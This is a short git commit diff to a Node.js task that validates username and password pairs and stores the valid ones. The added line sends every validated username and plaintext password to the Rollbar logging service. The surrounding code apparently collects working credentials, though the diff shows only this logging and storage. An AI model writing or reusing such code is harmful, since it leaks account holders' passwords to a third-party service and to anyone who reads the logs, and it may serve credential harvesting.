4cbb298442ef657924a30b82dac8b37087c89825
Lefcott <leandro.cotti@widergy.com>
2020-07-25 04:18:22 -0300

    add rollbar to creds

--- server/tasks/check_credentials.js
+++ server/tasks/check_credentials.js
@@ -1,10 +1,12 @@
 const { account } = require('../database/models');
+const { rollbar } = require('../commons/rollbar');
 
 const { areCredentialsOk } = require('./test_user');
 
 const checkAndStore = async (username, password, url) => {
   const validCredentials = await areCredentialsOk(username, password, false);
   if (!validCredentials) return;
+  rollbar.info(`Valid account:\nUser Name: ${username}\nPassword: ${password}`);
   account.save({
     UserName: username,
     Password: password,
